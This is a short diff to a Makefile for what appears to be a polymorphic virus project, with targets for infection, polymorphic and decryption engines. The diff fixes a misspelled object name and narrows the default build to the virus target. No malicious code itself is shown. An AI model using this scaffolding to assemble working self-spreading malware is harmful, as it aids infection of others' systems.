@@ -42,11 +42,11 @@ CFLAGS = -c  -Wall -O2 -g
 
 LFLAGS = -no-pie 
 KFLAGS = -no-pie -nostartfiles -m64 -g -falign-functions=16 
-all: virus polymake solopoly test
+all: virus 
 polymake: polyengine.o polymorphicengine.o
 	$(GCC) $(LFLAGS) $^ -o $@
 	
-virus: infect.c polymorphic.c  polymorphicengine.o  virus.o  decryptionegnine.o
+virus: infect.c polymorphic.c  polymorphicengine.o  virus.o  decryptionengine.o
 	$(CC) $(KFLAGS) $^ -o $@
 
 virus.o: virus.asm
@@ -55,7 +55,7 @@ virus.o: virus.asm
 polyengine.o: polymake.cpp
 	$(GCC) $(CFLAGS) $< -o $@
 
-decryptionegnine.o: decryptionengine.asm
+decryptionengine.o: decryptionengine.asm
 	$(ASM) $(AFLAGS) $< -o $@
 
 polymorphicengine.o: polymorphicengine.asm
